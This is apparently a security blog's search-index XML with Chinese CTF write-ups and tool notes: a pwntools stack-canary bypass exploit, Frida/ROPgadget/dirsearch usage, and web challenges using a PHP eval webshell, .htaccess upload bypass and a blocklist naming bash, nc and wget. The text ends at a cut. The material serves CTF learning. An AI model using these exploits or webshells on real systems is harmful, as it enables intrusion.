<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NewStar2023_Canary</title>
      <link href="/ghsc_ovo_0721/NewStar2023-Canary/"/>
      <url>/ghsc_ovo_0721/NewStar2023-Canary/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Canary-是什麼？"><a href="#1-Canary-是什麼？" class="headerlink" title="1. Canary 是什麼？"></a>1. Canary 是什麼？</h2><p>Canary (金絲雀) 是一種用來防止緩衝區溢位攻擊的保護機制。程式會在函式開始時在堆疊上放置一個隨機的值 (Canary)，並在函式返回前檢查這個值是否被改變。如果被改變，表示發生了緩衝區溢位，程式會立即終止。</p><p>在 32 位元程式中，Canary 通常是一個 4 位元組的值，並且以 <code>\x00</code> 結尾。它被放在 saved EBP (舊的 EBP) 和區域變數之間。</p><h2 id="2-看看程式的資訊"><a href="#2-看看程式的資訊" class="headerlink" title="2.看看程式的資訊"></a>2.看看程式的資訊</h2><img src="925cf0f80b5f3bad48b8b9ca73cf5957.png" alt="925cf0f80b5f3bad48b8b9ca73cf5957.png" /><p>是一個64位的ELF , 開了NX 和CANARY 和 RELERO</p><p>今次我們要學習如何用pwndbg來找出canary</p><p>先看看IDA的偽代碼:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[40]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(&quot;Welcome to NewStar CTF!!&quot;);</span><br><span class="line">  puts(&quot;Give me some gift?&quot;);</span><br><span class="line">  read(0, buf, 0x20u);</span><br><span class="line">  puts(&quot;Oh thanks,There is my gift:&quot;);</span><br><span class="line">  printf(buf);</span><br><span class="line">  puts(&quot;Show me your magic&quot;);</span><br><span class="line">  read(0, buf, 0x100u);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看見有兩個read函數 和一個printf函數 ,  read(0, buf, 0x20u); 第一個的read讀取20個字節(u) , 第二個100字節(u) , 由於開了NX 不能用shellcode , 要用後門函數或ROP鏈 , </p><p>在IDA發現了backdoor函數:</p><img src="375c9a3e1f280ef206960f1bfaa90216.png" alt="375c9a3e1f280ef206960f1bfaa90216.png" /><img src="91ac1c6d344675c4fdab435647931ac9.png" alt="91ac1c6d344675c4fdab435647931ac9.png" /><p>backdoor : 0x401262 </p><p>我們要在print找到canary 再用recvuntil()截取地址 , 最後在payload 中加入canary</p><p>首先叫出偉大的gdb大人 , 下一個斷點在read 函數那:</p><img src="1543c2757effce1d49829104a1a8b3f0.png" alt="1543c2757effce1d49829104a1a8b3f0.png" /><ol><li>b* main </li><li>b *0x401310</li><li>b *0x401335</li><li>b *0x40135A</li><li>cyclic 20 生成一個20字節的字符串 , 看看cyclic </li><li>stack 30</li></ol><img src="5ff12d98052698996f80eff1c506df62.png" alt="5ff12d98052698996f80eff1c506df62.png" /><p>0x00 是 canary 小金絲鳥是00 , 不難看 在 rbp-0x8那有一個00 地址是: 0x7fffffffd598</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">05:0028│-008     0x7fffffffd598 ◂— 0x2ae9f13115290200</span><br></pre></td></tr></table></figure><p>在gdb canary一下沒出來 :<br><img src="07b6e380a5d375a6276f404ec46e2f42.png" alt="07b6e380a5d375a6276f404ec46e2f42.png" /></p><p>–all 一下 : 出來捏</p><img src="078ebb6ca03cf8249cb81d4562e25bef.png" alt="078ebb6ca03cf8249cb81d4562e25bef.png" /><p>在-008那 , 那麼算一算偏移量:  5 </p><img src="67d1a20f339b7c34c181e34ab985583b.png" alt="67d1a20f339b7c34c181e34ab985583b.png" /><img src="8d0f4205b9f19924d5d45ed3846f9121.png" alt="8d0f4205b9f19924d5d45ed3846f9121.png" /><p>16*6 是canary , &#x2F;16 &#x3D; 6 </p><p>不難看出字符串偏移量為6 , 6+5 &#x3D; %11$p</p><p>現在寫一寫payload思路 :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">b&#x27;aaaaaa %11$p&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="ffa12e0ad0da22c35e68de34f82120e3.png" alt="ffa12e0ad0da22c35e68de34f82120e3.png" /><p>成功打印出來了 , </p><img src="55b2f70596f9090b7b0ab3303559a784.png" alt="55b2f70596f9090b7b0ab3303559a784.png" /><p>那我可以寫一下payload 了 , 垃圾數據+canary+rbp(0x8)+返回地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x98</span>-<span class="number">0x70</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(shell_addr)</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 22047)</span></span><br><span class="line">p = process(<span class="string">&quot;./canary&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./canary&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x401262</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Give me some gift?&#x27;</span>,<span class="string">b&#x27;aaaaa%11$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;00&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x98</span>-<span class="number">0x70</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(shell_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Show me your magic&#x27;</span> , payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="f71571a040bd1bfb5e48831796692882.png" alt="f71571a040bd1bfb5e48831796692882.png" /><img src="9e6b1f0ce6cc87c18d40d490fbac1cde.png" alt="9e6b1f0ce6cc87c18d40d490fbac1cde.png" />]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Frida使用</title>
      <link href="/ghsc_ovo_0721/Frida%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/Frida%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>frida 是一款基于 python+javascript 的 hook 框架，可运行在 android、ios、linux、win等各个平台，主要使用的动态二进制插桩技术。</p><p>我安裝在win conda frida_env 那</p><p><a href="https://">https://mumu.163.com/help/20220721/35047_730476.html</a></p><img src="87116c7103ef679365debd9886ff7240.png" alt="87116c7103ef679365debd9886ff7240.png" /><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell</p><p>adb connect 127.0.0.1:5555</p><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell&gt;adb devices<br>List of devices attached<br>127.0.0.1:5555  device<br>emulator-5554   device</p><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell&gt;adb -s 127.0.0.1:5555 shell getprop ro.product.cpu.abi<br>x86_64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 push 本地文件 /sdcard/</span><br><span class="line">adb -s 127.0.0.1:5555 pull /sdcard/文件 本地路径</span><br><span class="line">E:/BaiduNetdiskDownload/frida-server64/frida-server64 /sdcard/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 shell</span><br><span class="line">#1. 进入ADB Shell</span><br><span class="line">su</span><br><span class="line">mv /sdcard/frida-server64 /data/local/tmp/</span><br><span class="line">chmod 755 /data/local/tmp/frida-server64</span><br><span class="line">ls -la /data/local/tmp/frida-server64</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">./frida-server64 &amp;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每次重启模拟器后需要重新运行 ./frida-server64 &amp;</span><br></pre></td></tr></table></figure><br/><h2 id="我的啟動"><a href="#我的啟動" class="headerlink" title="我的啟動"></a>我的啟動</h2><h3 id="📋-前置準備"><a href="#📋-前置準備" class="headerlink" title="📋 前置準備"></a>📋 前置準備</h3><ol><li>確保MuMu模擬器已開啟</li><li>確認ADB工具可用</li></ol><h3 id="🔄-連接步驟"><a href="#🔄-連接步驟" class="headerlink" title="🔄 連接步驟"></a>🔄 連接步驟</h3><p>步驟1：連接MuMu模擬器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd E:\mumu\MuMuPlayer\nx_device\12.0\shell</span><br><span class="line">adb connect 127.0.0.1:5555</span><br></pre></td></tr></table></figure><p>步驟2：進入ADB Shell並啟動frida-server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">./frida-server64 &amp;</span><br></pre></td></tr></table></figure><p>步驟3：驗證frida-server運行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps | grep frida</span><br></pre></td></tr></table></figure><p>步驟4：在新CMD窗口測試Frida</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda activate frida_env</span><br><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>如果版本不匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==16.7.10</span><br><span class="line">pip install frida-tools==16.7.10</span><br></pre></td></tr></table></figure><h3 id="🎯-常用Frida命令"><a href="#🎯-常用Frida命令" class="headerlink" title="🎯 常用Frida命令"></a>🎯 常用Frida命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U                    # 列出進程</span><br><span class="line">frida-ps -Uai                  # 列出已安裝應用</span><br><span class="line">frida -U -f com.example.app    # 啟動並附加應用</span><br><span class="line">frida-ls-devices               # 列出設備</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ROPgadget 使用</title>
      <link href="/ghsc_ovo_0721/ROPgadget%20%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/ROPgadget%20%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>安裝:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line"> </span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"> </span><br><span class="line">cd ROPgadget</span><br><span class="line"> </span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">查找可存储寄存器的代码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string &quot;/bin/sh&quot;</span><br><span class="line">查找字符串</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;int&#x27;</span><br><span class="line">查找有int 0x80的地址</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dirsearch使用</title>
      <link href="/ghsc_ovo_0721/dirsearch%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/dirsearch%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target     //简单的查看网址目录和文件</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt        //使用文件拓展名为php,txt,zip的字典扫描目标url</span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 2</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 4 --scan-subdirs=/,/wp-content/,/wp-admin/</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --exclude-texts=This,AndThat</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt -H &quot;User-Agent: IE&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://xxxx        //日常使用</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r        //递归扫描，不过容易被检测</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30        //线程控制请求速率</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 --proxy 127.0.0.1:8080        //使用代理</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(WEB)2025 SWPU-NSSCTF 秋季招新入门训练赛 ak</title>
      <link href="/ghsc_ovo_0721/WEB-2025-SWPU-NSSCTF-%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/"/>
      <url>/ghsc_ovo_0721/WEB-2025-SWPU-NSSCTF-%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2025-SWPU-NSSCTF-秋季招新入门训练赛"><a href="#2025-SWPU-NSSCTF-秋季招新入门训练赛" class="headerlink" title="2025 SWPU-NSSCTF 秋季招新入门训练赛"></a><strong>2025 SWPU-NSSCTF 秋季招新入门训练赛</strong></h1><p>作者：ghsc</p><h2 id="1-gift-F12"><a href="#1-gift-F12" class="headerlink" title="1.gift_F12"></a>1.gift_F12</h2><p>簽到題!!!! 按F12</p><img src="ea1d840fdce1643f0679f8441d42a454.png" alt="ea1d840fdce1643f0679f8441d42a454.png" /><p>把WLLMCTF換成NSSCTF提交 </p><h2 id="2-Do-you-know-http"><a href="#2-Do-you-know-http" class="headerlink" title="2.Do_you_know_http"></a>2.Do_you_know_http</h2><img src="15a6aa5a5d627d7c6c6af2cbf3a3580c.png" alt="15a6aa5a5d627d7c6c6af2cbf3a3580c.png" /><p>要用bp抓包 , 可以看到出現了 Please use ‘WLLM’ browser! 在bp上開啟Repeater , 然後把包中的Uesr-Agent 方式改成WLLM</p><img src="a087106c7ae1afb280efa8de4e9bda56.png" alt="a087106c7ae1afb280efa8de4e9bda56.png" /><p>Send後服務器返回了.&#x2F;a.php , 可以把&#x2F;hello.php 改成a.php 再Send </p><img src="8ada2a790db134c7885a3af35606f208.png" alt="8ada2a790db134c7885a3af35606f208.png" /><p>要在本地才可以read  , 所以在包中加入 X-Forwarded-For:127.0.0.1</p><img src="93bfd15a54a6d67530a5982cd73dc321.png" alt="93bfd15a54a6d67530a5982cd73dc321.png" /><p>返回了一個&#x2F;secretttt.php , 再來把a.php 改成 secretttt.php ,得出flag </p><img src="1c642baa4c8ccf941b8062e36b97b514.png" alt="1c642baa4c8ccf941b8062e36b97b514.png" /><h2 id="3-WebFTP"><a href="#3-WebFTP" class="headerlink" title="3.WebFTP"></a>3.WebFTP</h2><img src="311fa37e164eb8b923532fe5b20faca2.png" alt="311fa37e164eb8b923532fe5b20faca2.png" /><p>使用kali 中的dirsearch 扫描 , 在kali 中打入 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch python.py -u http://node7.anna.nssctf.cn:29562/?m=login&amp;a=in</span><br></pre></td></tr></table></figure><img src="9a10db4e14ad10f73bf3f6772c0f6ef6.png" alt="9a10db4e14ad10f73bf3f6772c0f6ef6.png" /><p>存在git泄露 , 使用GitHack 下載克隆目录</p><img src="01adb43f1c64d8cfb3d9d1ba1fe3d795.png" alt="01adb43f1c64d8cfb3d9d1ba1fe3d795.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http://node7.anna.nssctf.cn:29562/?m=login&amp;a=in/.git</span><br></pre></td></tr></table></figure><img src="05b1101fe54144c815914cdf75f0c960.png" alt="05b1101fe54144c815914cdf75f0c960.png" /><p>空仓库。。。。。。。。。。</p><img src="84fe613a7014ffd37f31a06bb249307f.png" alt="84fe613a7014ffd37f31a06bb249307f.png" /><p>最後在phpinfo.php中找到了flag 。。</p><img src="a1d0e26387232549f1c999611ef7a649.png" alt="a1d0e26387232549f1c999611ef7a649.png" /><h2 id="4-jicao"><a href="#4-jicao" class="headerlink" title="4.jicao"></a>4.jicao</h2><p>这道题是一个php代码审计题目</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="title function_">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$id=$_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$json=<span class="title function_">json_decode</span>($_GET[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> ($id==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;$json[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;echo $flag;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用HackBar , POST  方法是 id &#x3D; wllmNB , GET 方法是 json &#x3D; {“x”:”wllm”}  (這是json 的GET方式)</p><img src="8eb0cc113238d50d6b4d6f73a89095f8.png" alt="8eb0cc113238d50d6b4d6f73a89095f8.png" /><br/><h2 id="5-easyupload1-0"><a href="#5-easyupload1-0" class="headerlink" title="5.easyupload1.0"></a>5.easyupload1.0</h2><img src="3c3df1f679fa27534846b37c7c7b74c9.png" alt="3c3df1f679fa27534846b37c7c7b74c9.png" /><p>把一句話木馬upload 上去 , 然後用BP攔下包轉去Repeater ..&#x2F;.</p><p>一句話木馬:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">BM</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt; @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;bhxdn&#x27;</span>]); <span class="title function_">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="44222a75c8417886544b761b68f7f345.png" alt="44222a75c8417886544b761b68f7f345.png" /><p>把 filename 由jpg 改成 php 然後發送</p><img src="e78ca8c5602c8a8b4b58322e042c57ab.png" alt="e78ca8c5602c8a8b4b58322e042c57ab.png" /><p>發送成功 ,  在.&#x2F;upload&#x2F;xiaoma.php 下 , 可以看見是觸發了木馬的 </p><img src="c65d3a42a9304b40d43ff0a3e55c1bf6.png" alt="c65d3a42a9304b40d43ff0a3e55c1bf6.png" /><p>然後可以開antsword add URL </p><img src="f8163c307de9b0d00ede75a327993126.png" alt="f8163c307de9b0d00ede75a327993126.png" /><p>可以回到html下找到flag </p><img src="f03d9d2819fbfc38b994b755f6b73674.png" alt="f03d9d2819fbfc38b994b755f6b73674.png" /><p>flag 為????????? WLLMCTF{I_d0nt_w4nna_wak3up} ???????,記得把前頭改成 NSSCTF{…} </p><p>可是flag不正確。。。。。。。。。。。。。。在根目錄都沒有</p><p>在根目錄下打開cmd  打：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printenv</span><br></pre></td></tr></table></figure><p>就有</p><img src="bce1b958ab13d6b3b5372cf0549a7e1d.png" alt="bce1b958ab13d6b3b5372cf0549a7e1d.png" /><p>原來flag在這FLAG&#x3D;NSSCTF{58c4de5b-6a3f-4dbc-8332-16ad44d25a11}</p><h2 id="6-easyupload2-0"><a href="#6-easyupload2-0" class="headerlink" title="6.easyupload2.0"></a>6.easyupload2.0</h2><p>這一次的過濾是在後台的,所以我要想辦法去做一個php後綴繞過, 我用了deepseek寫了一個字典</p><img src="a15c6720f893ee3fb529a4d60f902821.png" alt="a15c6720f893ee3fb529a4d60f902821.png" /><p>,先去抓包送去Intruder</p><img src="7caeb4abdc3ba54e9a49950c3d72e9a2.png" alt="7caeb4abdc3ba54e9a49950c3d72e9a2.png" /><p>把JPG$為payload 并插入字典,開始爆破 , 看看Length 427 的Response  是成功的 , 進去看看</p><img src="1dcc7c64b305fb28dfd58799daf0e827.png" alt="1dcc7c64b305fb28dfd58799daf0e827.png" /><p>查一下flag的位子,得出 flag : NSSCTF{9f5d5750-9a19-48c1-b41f-51d2db3e66a5}</p><img src="3bf6c15c0fc603e58634a61f1c81d911.png" alt="3bf6c15c0fc603e58634a61f1c81d911.png" /><h2 id="7-easyupload3-0"><a href="#7-easyupload3-0" class="headerlink" title="7.easyupload3.0"></a>7.easyupload3.0</h2><p>利用.htaccess进行绕过</p><p>.htaccess 是一个用于配置 Apache web 服务器的分布式配置文件，全称为 Hypertext Access（超文本访问）。它允许网站管理员在不修改服务器主配置文件（如 httpd.conf）的情况下，对特定目录及其子目录的服务器行为进行设置，具有灵活性高、针对性强的特点。<br>.htaccess 的核心作用<br>.htaccess 文件主要用于覆盖 Apache 主配置中的默认规则，实现对目录级别的精细化控制，常见功能包括：</p><p>URL 重写（如将动态 URL 转换为静态友好的形式）。<br>访问控制（限制特定 IP 或用户访问）。<br>自定义错误页面（如 404、500 错误页）。<br>缓存设置（控制浏览器或服务器缓存策略）。<br>实现 HTTPS 强制跳转。<br>文件类型关联（如设置特定扩展名的 MIME 类型）等。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;xiaoma.jpg&quot;</span>&gt;</span><br><span class="line"><span class="title class_">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="title class_">FilesMatch</span>&gt;</span><br><span class="line"></span><br><span class="line"># <span class="title class_">SetHandler</span> 指令强制指定文件的处理程序</span><br><span class="line"># 这里将 <span class="string">&quot;xiaoma.jpg&quot;</span> 交给 <span class="variable constant_">PHP</span> 处理器（application/x-httpd-php）处理</span><br><span class="line"># 即服务器会把这个图片文件当作 <span class="variable constant_">PHP</span> 脚本执行，而非直接返回图片内容</span><br></pre></td></tr></table></figure><p>先抓個包先 , 上傳一句話木馬.jpg </p><img src="d0945bcbaab0944101929114cf63e9fd.png" alt="d0945bcbaab0944101929114cf63e9fd.png" /><p>試試用爆破一下</p><img src="cf2ed89b24dabe2d073d1d63eb2ea044.png" alt="cf2ed89b24dabe2d073d1d63eb2ea044.png" /><p>最後只有htaccess成功 , 現在傳入.htaccess 腳本 </p><img src="730c04915892ed223f0bd9593c7b1554.png" alt="730c04915892ed223f0bd9593c7b1554.png" /><p>在&#x2F;upload 看看 。</p><img src="1e867f19185207051fe9f6a1dd1c5845.png" alt="1e867f19185207051fe9f6a1dd1c5845.png" /><img src="24b764ecf857a0859dab633a4199f957.png" alt="24b764ecf857a0859dab633a4199f957.png" /><p>的確是執行了phpinfo.php</p><img src="5a6553d967a2946298da259ca46dc083.png" alt="5a6553d967a2946298da259ca46dc083.png" /><p>NSSCTF{6b9d4421-ffc6-4432-b2d8-9f4b8e88c96c}</p><br/><h2 id="8-finalrce"><a href="#8-finalrce" class="headerlink" title="8.finalrce"></a>8.finalrce</h2><br/><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $url=$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,$url))</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_">exec</span>($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(1)這裡的代碼說明GET url 不能是 “bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|*|&quot;|&gt;|&lt;|%|$&#x2F;i “ </p><p>(2) exec() 沒有回顯 , </p><pre><code> exec()</code></pre><p>原型：string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</p><p>说明：</p><p>第一个参数， $command 是要执行的命令，例如： “ls -l”</p><p>第二个参数，$output 是command执行输出的结果，以数组格式存储</p><p>第三个参数，$return_var，用于保存command执行状态，0 - 成功，非零 - 失败</p><p>返回值，为command执行结果的最后一行</p><p>可參考這篇文章：</p><p><a href="https://">https://blog.csdn.net/afei__&#x2F;article&#x2F;details&#x2F;81901296</a></p><p>tee命令:Linux 